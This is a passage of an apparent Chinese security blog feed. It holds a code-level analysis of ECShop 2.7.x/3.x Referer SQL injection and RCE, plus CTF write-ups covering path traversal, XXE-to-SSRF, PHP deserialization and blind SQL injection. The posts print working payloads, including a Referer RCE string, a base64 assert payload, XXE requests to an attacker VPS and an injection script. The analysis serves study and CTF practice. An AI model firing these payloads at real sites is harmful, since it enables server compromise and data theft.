    <content type="html"><![CDATA[<h1 id="Echsop2-7-x几处漏洞分析"><a href="#Echsop2-7-x几处漏洞分析" class="headerlink" title="Echsop2.7.x几处漏洞分析"></a>Echsop2.7.x几处漏洞分析</h1><h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>这些洞是在半年前公布的细节，当时没来得及关注。最近在给自己定目标，决定重新刷一遍这些洞。</p><h1 id="SQL注入"><a href="#SQL注入" class="headerlink" title="SQL注入"></a>SQL注入</h1><p>由于未对Reffer内容进行过滤而造成的SQL注入</p><p>漏洞位置user.php:302</p><pre><code>elseif ($action == &#39;login&#39;){    if (empty($back_act))    {        if (empty($back_act) &amp;&amp; isset($GLOBALS[&#39;_SERVER&#39;][&#39;HTTP_REFERER&#39;]))        {            $back_act = strpos($GLOBALS[&#39;_SERVER&#39;][&#39;HTTP_REFERER&#39;], &#39;user.php&#39;) ? &#39;./index.php&#39; : $GLOBALS[&#39;_SERVER&#39;][&#39;HTTP_REFERER&#39;];        }        else        {            $back_act = &#39;user.php&#39;;        }    }    $smarty-&gt;assign(&#39;back_act&#39;, $back_act);    $smarty-&gt;display(&#39;user_passport.dwt&#39;);}</code></pre><p>$back_act可控为Reffer值，跟进assign</p><pre><code>/** * 注册变量 * * @access  public * @param   mix      $tpl_var * @param   mix      $value * * @return  void */function assign($tpl_var, $value = &#39;&#39;){    if (is_array($tpl_var))    {        foreach ($tpl_var AS $key =&gt; $val)        {            if ($key != &#39;&#39;)            {                $this-&gt;_var[$key] = $val;            }        }    }    else    {        if ($tpl_var != &#39;&#39;)        {            $this-&gt;_var[$tpl_var] = $value;        }    }}</code></pre><p>assign()注册了模板变量$this-&gt;_var[‘back_act’]，这里注册的变量在后面的页面模板编译中会用到</p><p>继续跟进user的display函数</p><pre><code>/** * 显示页面函数 * * @access  public * @param   string      $filename * @param   sting      $cache_id * * @return  void */function display($filename, $cache_id = &#39;&#39;){    error_reporting(E_ALL ^ E_NOTICE);    $out = $this-&gt;fetch($filename, $cache_id);    if (strpos($out, $this-&gt;_echash) !== false)    {        $k = explode($this-&gt;_echash, $out);        foreach ($k AS $key =&gt; $val)        {            if (($key % 2) == 1)            {                $k[$key] = $this-&gt;insert_mod($val);            }        }        $out = implode(&#39;&#39;, $k);    }    echo $out;}</code></pre><p>Display中调用fetch函数处理模板文件：user_passport.dwt，跟进关键代码</p><pre><code>/** * 处理模板文件 * * @access  public * @param   string      $filename * @param   sting      $cache_id * * @return  sring */function fetch($filename, $cache_id = &#39;&#39;){    ...    $out = $this-&gt;make_compiled($filename);    ...    return $out; // 返回html数据}</code></pre><p>$filename就是user_passport.dwt，关键内容如下</p><pre><code>&lt;tr&gt;&lt;td colspan=&quot;2&quot; align=&quot;center&quot;&gt;&lt;input type=&quot;hidden&quot; name=&quot;act&quot; value=&quot;act_login&quot; /&gt;  &lt;input type=&quot;hidden&quot; name=&quot;back_act&quot; value=&quot;{$back_act}&quot; /&gt;  &lt;input type=&quot;submit&quot; name=&quot;submit&quot; value=&quot;{$lang.confirm_login}&quot; /&gt;&lt;/td&gt;&lt;/tr&gt;</code></pre><p>通过make_compiled函数编译模板文件，编译时会把之前注册的模板变量渲染到{$back_act}。$out即为渲染后的html代码块</p><p>继续跟进流程，回到display。$out内容被分割为两部分，分割依据是$this-&gt;_echash，而$this-&gt;_echash参数值固定<br><img src="https://i.loli.net/2019/02/01/5c546878d638b.png" alt></p><pre><code>$k = explode($this-&gt;_echash, $out);foreach ($k AS $key =&gt; $val){    if (($key % 2) == 1)    {        $k[$key] = $this-&gt;insert_mod($val);    }}</code></pre><p>跟进insert_mod</p><pre><code>function insert_mod($name) // 处理动态内容{    list($fun, $para) = explode(&#39;|&#39;, $name);    $para = unserialize($para);    $fun = &#39;insert_&#39; . $fun;    return $fun($para);}</code></pre><p>继续对$out内容以“|”形式分割成$fun、$para，|后的内容进行反序列化，再动态调用$fun函数。至此，函数名$fun可控，函数内容$para可控，找一个以Insert_开头的可利用的函数</p><pre><code>function insert_ads($arr){    static $static_res = NULL;    $time = gmtime();    if (!empty($arr[&#39;num&#39;]) &amp;&amp; $arr[&#39;num&#39;] != 1)    {        $sql  = &#39;SELECT a.ad_id, a.position_id, a.media_type, a.ad_link, a.ad_code, a.ad_name, p.ad_width, &#39; .                    &#39;p.ad_height, p.position_style, RAND() AS rnd &#39; .                &#39;FROM &#39; . $GLOBALS[&#39;ecs&#39;]-&gt;table(&#39;ad&#39;) . &#39; AS a &#39;.                &#39;LEFT JOIN &#39; . $GLOBALS[&#39;ecs&#39;]-&gt;table(&#39;ad_position&#39;) . &#39; AS p ON a.position_id = p.position_id &#39; .                &quot;WHERE enabled = 1 AND start_time &lt;= &#39;&quot; . $time . &quot;&#39; AND end_time &gt;= &#39;&quot; . $time . &quot;&#39; &quot;.                    &quot;AND a.position_id = &#39;&quot; . $arr[&#39;id&#39;] . &quot;&#39; &quot; .                &#39;ORDER BY rnd LIMIT &#39; . $arr[&#39;num&#39;];        $res = $GLOBALS[&#39;db&#39;]-&gt;GetAll($sql);    }</code></pre><p>触发SQL注入，构造的PAYLOAD形式：</p><pre><code>echash+ads|serialize(array(&quot;num&quot;=&gt;sqlpayload,&quot;id&quot;=&gt;1))</code></pre><p>创宇提供的一个payload示例如下：</p><pre><code>Referer: 554fcae493e564ee0dc75bdf2ebf94caads|a:2:{s:3:&quot;num&quot;;s:72:&quot;0,1 procedure analyse(extractvalue(rand(),concat(0x7e,version())),1)-- -&quot;;s:2:&quot;id&quot;;i:1;}</code></pre><p>采用limit注入，利用procedure analyse函数。具体见P师傅文章：<a href="https://www.leavesongs.com/PENETRATION/sql-injections-in-mysql-limit-clause.html" target="_blank" rel="noopener">https://www.leavesongs.com/PENETRATION/sql-injections-in-mysql-limit-clause.html</a></p><h1 id="RCE分析"><a href="#RCE分析" class="headerlink" title="RCE分析"></a>RCE分析</h1><p>RCE利用点还是insert_ads函数，参数的处理流程很大一部分是上文SQL注入的流程，这里分析3.x版本的RCE</p><p>继续跟进ads函数，重点部分代码如下：</p><pre><code>function insert_ads($arr){    foreach ($res AS $row)    {        if ($row[&#39;position_id&#39;] != $arr[&#39;id&#39;])        {            continue;        }        $position_style = $row[&#39;position_style&#39;];        ...    }    $position_style = &#39;str:&#39; . $position_style;    $GLOBALS[&#39;smarty&#39;]-&gt;assign(&#39;ads&#39;, $ads);    $val = $GLOBALS[&#39;smarty&#39;]-&gt;fetch($position_style);}</code></pre><p>$res为查询结果，即$row[‘position_id’]可用SQL注入的Union select控制，$arr[‘id’]也可控，当两者相等时$position_style的值就可控为$row[‘position_style’]。接着又调用assgin注册变量、fetch编译模板。再看fetch函数</p><pre><code>/**     * 处理模板文件     *     * @access  public     * @param   string      $filename     * @param   sting      $cache_id     *     * @return  sring     */function fetch($filename, $cache_id = &#39;&#39;){    if (strncmp($filename,&#39;str:&#39;, 4) == 0)    {        $out = $this-&gt;_eval($this-&gt;fetch_str(substr($filename, 4)));    }    else    {         ......</code></pre><p>由于字符串前被拼接了str:，所以进入$this-&gt;_eval函数处理，这也是最终的漏洞触发点，可以eval我们构造的恶意语句。<br><img src="https://i.loli.net/2019/02/01/5c5468790d352.png" alt></p><p>但是再_eval之前经过fetch_str处理字符串，跟进</p><pre><code>    /**     * 处理字符串函数     *     * @access  public     * @param   string     $source     *     * @return  sring     */    function fetch_str($source)    {        if (!defined(&#39;ECS_ADMIN&#39;))        {            $source = $this-&gt;smarty_prefilter_preCompile($source);        }        $source=preg_replace(&quot;/([^a-zA-Z0-9_]{1,1})+(copy|fputs|fopen|file_put_contents|fwrite|eval|phpinfo)+( |\()/is&quot;, &quot;&quot;, $source);        if(preg_match_all(&#39;~(&lt;\?(?:\w+|=)?|\?&gt;|language\s*=\s*[\&quot;\&#39;]?php[\&quot;\&#39;]?)~is&#39;, $source, $sp_match))        {            $sp_match[1] = array_unique($sp_match[1]);            for ($curr_sp = 0, $for_max2 = count($sp_match[1]); $curr_sp &lt; $for_max2; $curr_sp++)            {                $source = str_replace($sp_match[1][$curr_sp],&#39;%%%SMARTYSP&#39;.$curr_sp.&#39;%%%&#39;,$source);            }             for ($curr_sp = 0, $for_max2 = count($sp_match[1]); $curr_sp &lt; $for_max2; $curr_sp++)            {                 $source= str_replace(&#39;%%%SMARTYSP&#39;.$curr_sp.&#39;%%%&#39;, &#39;&lt;?php echo \&#39;&#39;.str_replace(&quot;&#39;&quot;, &quot;\&#39;&quot;, $sp_match[1][$curr_sp]).&#39;\&#39;; ?&gt;&#39;.&quot;\n&quot;, $source);            }         }         return preg_replace(&quot;/{([^\}\{\n]*)}/e&quot;, &quot;\$this-&gt;select(&#39;\\1&#39;);&quot;, $source);    }</code></pre><p>第一个正则会匹配危险的字符串函数，重点在最后一个正则。\\1是替代表达，匹配到的字符串会替代\\1的位置。</p><p>eg:<code>return preg_replace(&quot;/{([^\}\{\n]*)}/e&quot;, &quot;\$this-&gt;select(&#39;\\1&#39;);&quot;, &quot;xxx{abc}xxx&quot;);</code>结果就是<code>return $this-&gt;select(&#39;{abc}&#39;)</code></p><p>跟进select函数</p><pre><code>/** * 处理{}标签 * * @access  public * @param   string      $tag * * @return  sring */function select($tag){    $tag = stripslashes(trim($tag));    if (empty($tag))    {        return &#39;{}&#39;;    }    elseif ($tag{0} == &#39;*&#39; &amp;&amp; substr($tag, -1) == &#39;*&#39;) // 注释部分    {        return &#39;&#39;;    }    elseif ($tag{0} == &#39;$&#39;) // 变量    {//            if(strpos($tag,&quot;&#39;&quot;) || strpos($tag,&quot;]&quot;))//            {//                 return &#39;&#39;;//            }        return &#39;&lt;?php echo &#39; . $this-&gt;get_val(substr($tag, 1)) . &#39;; ?&gt;&#39;;    }    ......</code></pre><p>trim处理了字符串两边的{}，最后返回一段php标签下的字符串，如果成功返回，则之前的eval就可以执行这段php字符串。不过这个值的获取取决于get_val，跟进get_val</p><pre><code>/** * 处理smarty标签中的变量标签 * * @access  public * @param   string     $val * * @return  bool */function get_val($val){    if (strrpos($val, &#39;[&#39;) !== false)    {        $val = preg_replace(&quot;/\[([^\[\]]*)\]/eis&quot;, &quot;&#39;.&#39;.str_replace(&#39;$&#39;,&#39;\$&#39;,&#39;\\1&#39;)&quot;, $val);    }    if (strrpos($val, &#39;|&#39;) !== false)    {        $moddb = explode(&#39;|&#39;, $val);        $val = array_shift($moddb);    }    if (empty($val))    {        return &#39;&#39;;    }    if (strpos($val, &#39;.$&#39;) !== false)    {        $all = explode(&#39;.$&#39;, $val);        foreach ($all AS $key =&gt; $val)        {            $all[$key] = $key == 0 ? $this-&gt;make_var($val) : &#39;[&#39;. $this-&gt;make_var($val) . &#39;]&#39;;        }        $p = implode(&#39;&#39;, $all);    }    else    {        $p = $this-&gt;make_var($val);    }</code></pre><p>若$val不存在<code>.$</code>则进入make_var()</p><pre><code>/** * 处理去掉$的字符串 * * @access  public * @param   string     $val * * @return  bool */function make_var($val){    if (strrpos($val, &#39;.&#39;) === false)    {        if (isset($this-&gt;_var[$val]) &amp;&amp; isset($this-&gt;_patchstack[$val]))        {            $val = $this-&gt;_patchstack[$val];        }        $p = &#39;$this-&gt;_var[\&#39;&#39; . $val . &#39;\&#39;]&#39;;    }    else    {       .....</code></pre><p>这个make_var的$val可控，则表明返回的$p可控，最终返回的$this-&gt;get_val()就可控，也就是$this-&gt;_eval的实参可控（一段PHP标签下的字符串），从而getshell。</p><p>构造Payload我用逆推的思路，逐步满足每个函数判断的条件<br><img src="https://i.loli.net/2019/02/02/5c54fa8f5fb8b.png" alt></p><p>最终的POC要结合SQL注入，通过id和num参数将order by注释<br><img src="https://i.loli.net/2019/02/02/5c54fa8f75fb6.png" alt></p><p>再利用union select构造指定列的值：第二列postion_id，第七列position_style<br><img src="https://images.seebug.org/content/images/2018/09/cd7f6796-c175-46c0-a7c4-9cdb480ab960.png-w331s" alt></p><pre><code>Referer: 554fcae493e564ee0dc75bdf2ebf94caads|a:2:{s:3:&quot;num&quot;;s:110:&quot;*/ union select 1,0x27202f2a,3,4,5,6,7,8,0x7b24616263275d3b6563686f20706870696e666f2f2a2a2f28293b2f2f7d,10-- -&quot;;s:2:&quot;id&quot;;s:4:&quot;&#39; /*&quot;;}554fcae493e564ee0dc75bdf2ebf94ca</code></pre><p>id的值就是<code>&#39; /*</code>，num的值<code>*/ union select 1,0x27202f2a,3,4,5,6,7,8,0x7b24616263275d3b6563686f20706870696e666f2f2a2a2f28293b2f2f7d,10-- -</code>，0x27202f2a是<code>&#39; /*</code>的16进制值，也就是第二列<code>$row[&#39;position_id&#39;]</code>的值<code>。0x7b24616263275d3b6563686f20706870696e666f2f2a2a2f28293b2f2f7d</code>为<code>{$&#39;];phpinfo/**/();//}</code>的16进制值</p><h1 id="漏洞修复"><a href="#漏洞修复" class="headerlink" title="漏洞修复"></a>漏洞修复</h1><p>看到ecshop4/ecshop/includes/lib_insert.php<br><img src="https://images.seebug.org/content/images/2018/09/d542c73a-d3ef-4e89-8394-aa85c7f1332e.png-w331s" alt></p><p>对id和num进行强制类型转换了，字符串无法利用</p><h1 id="题外话"><a href="#题外话" class="headerlink" title="题外话"></a>题外话</h1><p>创宇WAF拦截的Payload是这样</p><pre><code>{$abc&#39;];assert(base64_decode(&#39;YXNzZXJ0KCRfR0VUWyd4J10pOw==&#39;));//}</code></pre><p>巧妙解决了$_GET[]的[]问题，测试用法</p><p><img src="https://i.loli.net/2019/02/02/5c55aa16d0c98.png" alt></p><h1 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h1><p><a href="https://paper.seebug.org/695/#_5" target="_blank" rel="noopener">https://paper.seebug.org/695/#_5</a></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h1 id=&quot;Echsop2-7-x几处漏洞分析&quot;&gt;&lt;a href=&quot;#Echsop2-7-x几处漏洞分析&quot; class=&quot;headerlink&quot; title=&quot;Echsop2.7.x几处漏洞分析&quot;&gt;&lt;/a&gt;Echsop2.7.x几处漏洞分析&lt;/h1&gt;&lt;h1 id=&quot;前言&quot;&gt;&lt;
      
    
    </summary>
    
    
      <category term="代码审计" scheme="https://hpdoger.cn/tags/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/"/>
    
  </entry>
  
  <entry>
    <title>FireShellCTF2019 Bad Injections解题记录</title>
    <link href="https://hpdoger.cn/2019/01/30/FireShellCTF2019%20Bad%20Injections%E8%A7%A3%E9%A2%98%E8%AE%B0%E5%BD%95/"/>
    <id>https://hpdoger.cn/2019/01/30/FireShellCTF2019 Bad Injections解题记录/</id>
    <published>2019-01-29T16:00:00.000Z</published>
    <updated>2019-01-30T15:07:44.000Z</updated>
    
    <content type="html"><![CDATA[<h1 id="FireShellCTF2019-Bad-Injections解题记录"><a href="#FireShellCTF2019-Bad-Injections解题记录" class="headerlink" title="FireShellCTF2019 Bad Injections解题记录"></a>FireShellCTF2019 Bad Injections解题记录</h1><p>原文投稿安全客：<a href="https://www.anquanke.com/post/id/170381" target="_blank" rel="noopener">https://www.anquanke.com/post/id/170381</a></p><p>题目名称：Bad Injections</p><p>题目地址：<a href="http://68.183.31.62:94" target="_blank" rel="noopener">http://68.183.31.62:94</a></p><p>貌似现在还没有关环境，这是整场比赛最简单的Web题…Web题质量很高，表哥们可以趁环境在去爽一下</p><p>主页面有四个功能，纯静态页面。右键about页面源码信息：<br><img src="https://i.loli.net/2019/01/28/5c4e7566b0a62.png" alt></p><p>给个本地web目录</p><p>接着在list页面的源码里发现信息：<br><img src="https://i.loli.net/2019/01/28/5c4e7581ec7bc.png" alt></p><p>因为页面显示图片，url没有其他参数，猜测应该是readfile之类的函数读的文件。File+hash的方法，既然是ctf，那hash应该不会加key。下载一个文件试一下能不能成功</p><pre><code>68.183.31.62:94/download?file=files/../../../../../etc/passwd&amp;hash=ab56ade6fe16a65bce82a7cd833f13cc</code></pre><p>这里让<code>hash = md5(file)</code>，成功下载到了/etc/passwd<br><img src="https://i.loli.net/2019/01/28/5c4e75df5ff3d.png" alt></p><p>尝试去读/flag发现文件不存在，去读.bash_history也不存在..捷径失败…</p><p>看到之前list下载的test.txt内容是这样的<br><img src="https://i.loli.net/2019/01/28/5c4e75f994d2c.png" alt></p><p>down一下download的源码，顺便fuzz一下Controllers的文件</p><pre><code>68.183.31.62:94/download?file=files/../../app/Controllers/Download.php&amp;hash=f350edcfda52eb0127c4410633efd260</code></pre><p>字典只跑出来了个admin.php<br><img src="https://i.loli.net/2019/01/28/5c4e7631e6291.png" alt></p><p>看了源码感觉存在一个XXE或者是create_function的代码注入，因为找不到/flag所以利用XXE没什么卵用，应该就是代码注入点，但是要加载外部文本来引入正确xml文本才能进入函数判断。</p><p>尝试请求admin?url=xxx&amp;order=xx死活获取不到页面，应该是路由没找对。在这卡了一会，请教腹黑师傅，才想起来去读入口文件。</p><pre><code>68.183.31.62:94/download?file=files/../../app/Index.php&amp;hash=1dfd7acd700544ea7d26b8368935c4e8</code></pre><p>/app/index.php</p><pre><code>&lt;?phpini_set(&#39;display_errors&#39;,1);ini_set(&#39;display_startup_erros&#39;,1);error_reporting(E_ALL);require_once(&#39;Routes.php&#39;);function __autoload($class_name){  if(file_exists(&#39;./classes/&#39;.$class_name.&#39;.php&#39;)){    require_once &#39;./classes/&#39;.$class_name.&#39;.php&#39;;  }else if(file_exists(&#39;./Controllers/&#39;.$class_name.&#39;.php&#39;)){    require_once &#39;./Controllers/&#39;.$class_name.&#39;.php&#39;;  }}</code></pre><p>再去读路由/app/Routes.php，看看是个什么狗屁规则</p><pre><code>&lt;?phpRoute::set(&#39;index.php&#39;,function(){  Index::createView(&#39;Index&#39;);});Route::set(&#39;index&#39;,function(){  Index::createView(&#39;Index&#39;);});Route::set(&#39;about-us&#39;,function(){  AboutUs::createView(&#39;AboutUs&#39;);});Route::set(&#39;contact-us&#39;,function(){  ContactUs::createView(&#39;ContactUs&#39;);});Route::set(&#39;list&#39;,function(){  ContactUs::createView(&#39;Lista&#39;);});Route::set(&#39;verify&#39;,function(){     if(!isset($_GET[&#39;file&#39;]) &amp;&amp; !isset($_GET[&#39;hash&#39;])){    Verify::createView(&#39;Verify&#39;);  }else{    Verify::verifyFile($_GET[&#39;file&#39;],$_GET[&#39;hash&#39;]);  //设置session，file和hash对应请求文件  }});Route::set(&#39;download&#39;,function(){  if(isset($_REQUEST[&#39;file&#39;]) &amp;&amp; isset($_REQUEST[&#39;hash&#39;])){    echo Download::downloadFile($_REQUEST[&#39;file&#39;],$_REQUEST[&#39;hash&#39;]);  }else{    echo &#39;jdas&#39;;  }});Route::set(&#39;verify/download&#39;,function(){  Verify::downloadFile($_REQUEST[&#39;file&#39;],$_REQUEST[&#39;hash&#39;]);});Route::set(&#39;custom&#39;,function(){  $handler = fopen(&#39;php://input&#39;,&#39;r&#39;);  $data = stream_get_contents($handler); // xml  if(strlen($data) &gt; 1){    Custom::Test($data);  }else{    Custom::createView(&#39;Custom&#39;);  }});Route::set(&#39;admin&#39;,function(){  if(!isset($_REQUEST[&#39;rss&#39;]) &amp;&amp; !isset($_REQUES[&#39;order&#39;])){    Admin::createView(&#39;Admin&#39;);  }else{    if($_SERVER[&#39;REMOTE_ADDR&#39;] == &#39;127.0.0.1&#39; || $_SERVER[&#39;REMOTE_ADDR&#39;] == &#39;::1&#39;){      Admin::sort($_REQUEST[&#39;rss&#39;],$_REQUEST[&#39;order&#39;]);    }else{     echo &quot;;(&quot;;    }  }});Route::set(&#39;custom/sort&#39;,function(){  Custom::sort($_REQUEST[&#39;rss&#39;],$_REQUEST[&#39;order&#39;]);});Route::set(&#39;index&#39;,function(){ Index::createView(&#39;Index&#39;);});</code></pre><p>原来我只下载了download和admin页面，还有其它功能页面没下载到，看到了玄学的admin规则如下，原来只有本地才能请求到sort函数</p><pre><code>Route::set(&#39;admin&#39;,function(){  if(!isset($_REQUEST[&#39;rss&#39;]) &amp;&amp; !isset($_REQUES[&#39;order&#39;])){    Admin::createView(&#39;Admin&#39;);  }else{    if($_SERVER[&#39;REMOTE_ADDR&#39;] == &#39;127.0.0.1&#39; || $_SERVER[&#39;REMOTE_ADDR&#39;] == &#39;::1&#39;){      Admin::sort($_REQUEST[&#39;rss&#39;],$_REQUEST[&#39;order&#39;]);    }else{     echo &quot;;(&quot;;    }  }});</code></pre><p>找一下其他利用，再看Custom</p><pre><code>Route::set(&#39;custom&#39;,function(){  $handler = fopen(&#39;php://input&#39;,&#39;r&#39;);  $data = stream_get_contents($handler);   if(strlen($data) &gt; 1){    Custom::Test($data);  }else{    Custom::createView(&#39;Custom&#39;);  }});</code></pre><p>Custom::Test</p><pre><code>class Custom extends Controller{  public static function Test($string){      $root = simplexml_load_string($string,&#39;SimpleXMLElement&#39;,LIBXML_NOENT);      $test = $root-&gt;name;      echo $test;  }}</code></pre><p>$data内容可控为php://input，Test函数再将$data作为xml文本解析，那么存在XXE的问题，验证了一下可以利用<br><img src="https://i.loli.net/2019/01/28/5c4e7655ea8f6.png" alt></p><p>联想到刚才admin页面只有本地才能请求，那就用Custom的XXE当跳板好了，测试一下是否能当跳板</p><p>poc:</p><pre><code>&lt;?xml version=&#39;1.0&#39;?&gt; &lt;!DOCTYPE name [&lt;!ENTITY  file SYSTEM &quot;http://localhost/admin?rss=http%3A%2F%2Fyour_vps%2Fxxe.txt&amp;order=1&quot;&gt;]&gt;&lt;note&gt;&lt;name&gt;&amp;file;&lt;/name&gt;&lt;/note&gt;</code></pre><p><img src="https://i.loli.net/2019/01/28/5c4e7677a9567.png" alt><br>admin页面确实file_get_contents到了我vps的xxe文本。</p><p>尝试去构造正确的xml文本到执行到usort函数进行注入，warning不影响代码执行</p><p><code>http://vps/xxe.txt</code></p><pre><code>&lt;?xml version=&quot;1.0&quot; encoding=&quot;utf-8&quot;?&gt;&lt;root&gt;&lt;channel&gt;&lt;item&gt;&lt;link&gt;@hpdoger.me&lt;/link&gt;&lt;/item&gt;&lt;item&gt;&lt;link&gt;@souhu.com&lt;/link&gt;&lt;/item&gt;&lt;/channel&gt;&lt;/root&gt;</code></pre><p><code>POC</code></p><pre><code>&lt;?xml version=&#39;1.0&#39;?&gt; &lt;!DOCTYPE name [&lt;!ENTITY  file SYSTEM &quot;http://localhost/admin?rss=http%3A%2F%2Fvps%2Fxxe.txt&amp;order=id%29%3B%7Decho%28file_get_contents%28%27..%2F..%2F..%2Fda0f72d5d79169971b62a479c34198e7%27%29%29%3B%2F%2F&quot;&gt;]&gt;&lt;note&gt;&lt;name&gt;&amp;file;&lt;/name&gt;&lt;/note&gt;</code></pre><p><img src="https://i.loli.net/2019/01/28/5c4e768d57f89.png" alt></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h1 id=&quot;FireShellCTF2019-Bad-Injections解题记录&quot;&gt;&lt;a href=&quot;#FireShellCTF2019-Bad-Injections解题记录&quot; class=&quot;headerlink&quot; title=&quot;FireShellCTF2019 Bad I
      
    
    </summary>
    
    
      <category term="CTF" scheme="https://hpdoger.cn/tags/CTF/"/>
    
      <category term="Web" scheme="https://hpdoger.cn/tags/Web/"/>
    
  </entry>
  
  <entry>
    <title>安恒杯月赛19新年场WriteUp</title>
    <link href="https://hpdoger.cn/2019/01/26/%E5%AE%89%E6%81%92%E6%9D%AF%E6%9C%88%E8%B5%9B19%E6%96%B0%E5%B9%B4%E5%9C%BAWriteUp/"/>
    <id>https://hpdoger.cn/2019/01/26/安恒杯月赛19新年场WriteUp/</id>
    <published>2019-01-25T16:00:00.000Z</published>
    <updated>2019-01-26T12:49:58.000Z</updated>
    
    <content type="html"><![CDATA[<h1 id="安恒杯月赛19新年场WriteUp"><a href="#安恒杯月赛19新年场WriteUp" class="headerlink" title="安恒杯月赛19新年场WriteUp"></a>安恒杯月赛19新年场WriteUp</h1><h1 id="Web"><a href="#Web" class="headerlink" title="Web"></a>Web</h1><h2 id="WEB1"><a href="#WEB1" class="headerlink" title="WEB1"></a>WEB1</h2><p>题目代码</p><pre><code>&lt;?php  @error_reporting(1); include &#39;flag.php&#39;;class baby {       protected $skyobj;      public $aaa;    public $bbb;    function __construct()     {              $this-&gt;skyobj = new sec;    }      function __toString()          {                  if (isset($this-&gt;skyobj))              return $this-&gt;skyobj-&gt;read();          }  }  class cool {        public $filename;         public $nice;    public $amzing;     function read()          {           $this-&gt;nice = unserialize($this-&gt;amzing);        $this-&gt;nice-&gt;aaa = $sth;        if($this-&gt;nice-&gt;aaa === $this-&gt;nice-&gt;bbb)        {            $file = &quot;./{$this-&gt;filename}&quot;;                    if (file_get_contents($file))                     {                              return file_get_contents($file);             }              else             {                 return &quot;you must be joking!&quot;;             }            }    }  }  class sec {      function read()         {                  return &quot;it&#39;s so sec~~&quot;;          }  }  if (isset($_GET[&#39;data&#39;]))  {     $Input_data = unserialize($_GET[&#39;data&#39;]);    echo $Input_data; } else {     highlight_file(&quot;./index.php&quot;); } ?&gt;</code></pre><h3 id="考点"><a href="#考点" class="headerlink" title="考点"></a>考点</h3><p>考点一：echo可以调用toString()函数用来返回flag.php内容</p><p>考点二：让$this-&gt;nice是一个非baby的类，就能绕过$str</p><p>考点三：unserialize()不会执行<strong>construct，外部不可控protected变量skyobj，但是序列化时可以放到</strong>construct内部控制</p><h3 id="EXP"><a href="#EXP" class="headerlink" title="EXP"></a>EXP</h3><pre><code>class baby {       protected $skyobj;      function __construct()     {          $this-&gt;skyobj = new cool;    $this-&gt;skyobj-&gt;amzing = serialize(new sec);    $this-&gt;skyobj-&gt;filename = &quot;flag.php&quot;;    }  }class sec {    function read(){}}class cool {     public $filename;         public $nice;    public $amzing; }$test = new baby();echo urlencode(serialize($test));</code></pre><h2 id="WEB2"><a href="#WEB2" class="headerlink" title="WEB2"></a>WEB2</h2><p>约束攻击登陆admin</p><p>登陆后盲注</p><p>EXP</p><pre><code>#!/usr/bin/env python# encoding: utf-8import requestsimport timedef login(payload):    url = &quot;http://106.12.21.77/Admin/User/Index?search[table]=flag/**/where/**/1/**/and/**/%s&quot; % (payload)    # print &quot;[+] %s&quot; % (url)    before_time = time.time()    cookies = {&#39;PHPSESSID&#39;: &#39;3kus5jrhoqav8te0kf74hglii7&#39;}    response = requests.get(url, cookies=cookies)    # content = response.content    after_time = time.time()    offset = after_time - before_time    # print &quot;[*] Offset : %f&quot; % (offset)    if offset &gt; 2.5:        return True    else:        return Falsedef main():    data = &quot;&quot;    charaters = &quot;0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ&quot;    for i in range(1, 40, 1):        for j in charaters:            payload = &quot;if((mid((select/**/flag/**/from/**/flag),%d,1))=&#39;%s&#39;,sleep(3),0)%%23&quot; % (i, j)            if login(payload):                data += str(j)                print &quot;[+] Found : %s&quot; % (data)                breakif __name__ == &quot;__main__&quot;:    main()</code></pre><h1 id="MISC"><a href="#MISC" class="headerlink" title="MISC"></a>MISC</h1><h2 id="隐写"><a href="#隐写" class="headerlink" title="隐写"></a>隐写</h2><pre><code>binwalk -e zhu.jpg</code></pre><p>Stegsolve</p><h2 id="MISC2"><a href="#MISC2" class="headerlink" title="MISC2"></a>MISC2</h2><h3 id="内存取证"><a href="#内存取证" class="headerlink" title="内存取证"></a>内存取证</h3><p>volatility一把梭</p><pre><code>volatility imageinfo -f memory #分析操作系统volatility hashdump -f memory --profile=WinXPSP2x86 #查看当前操作系统中的 password hash</code></pre><p><img src="https://i.loli.net/2019/01/26/5c4c0c216b399.jpg" alt></p><p>得到管理员hash如下：</p><pre><code>Administrator:500:0182bd0bd4444bf867cd839bf040d93b:c22b315c040ae6e0efee3518d830362b:::</code></pre><p>所以<code>c22b315c040ae6e0efee3518d830362b</code>即为管理员密码的md5值，解出来是123456789，再md5一下就行。</p><h3 id="相关链接"><a href="#相关链接" class="headerlink" title="相关链接"></a>相关链接</h3><p>内存取证工具 volatility 使用说明：<a href="https://www.restran.net/2017/08/10/memory-forensics-tool-volatility/" target="_blank" rel="noopener">https://www.restran.net/2017/08/10/memory-forensics-tool-volatility/</a></p><h1 id="CRYPTO"><a href="#CRYPTO" class="headerlink" title="CRYPTO"></a>CRYPTO</h1><h2 id="键盘密码"><a href="#键盘密码" class="headerlink" title="键盘密码"></a>键盘密码</h2><p>ypau -&gt; flag</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h1 id=&quot;安恒杯月赛19新年场WriteUp&quot;&gt;&lt;a href=&quot;#安恒杯月赛19新年场WriteUp&quot; class=&quot;headerlink&quot; title=&quot;安恒杯月赛19新年场WriteUp&quot;&gt;&lt;/a&gt;安恒杯月赛19新年场WriteUp&lt;/h1&gt;&lt;h1 id=&quot;Web&quot;&gt;
      
    
    </summary>
    
    
      <category term="CTF" scheme="https://hpdoger.cn/tags/CTF/"/>
    
      <category term="Web" scheme="https://hpdoger.cn/tags/Web/"/>
    
  </entry>
  
  <entry>
    <title>ThinkPHP5.0.0~5.0.23RCE漏洞分析</title>
    <link href="https://hpdoger.cn/2019/01/20/ThinkPHP5.0.0~5.0.23RCE%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/"/>
    <id>https://hpdoger.cn/2019/01/20/ThinkPHP5.0.0~5.0.23RCE漏洞分析/</id>
    <published>2019-01-19T16:00:00.000Z</published>
    <updated>2019-01-30T15:59:18.000Z</updated>
    
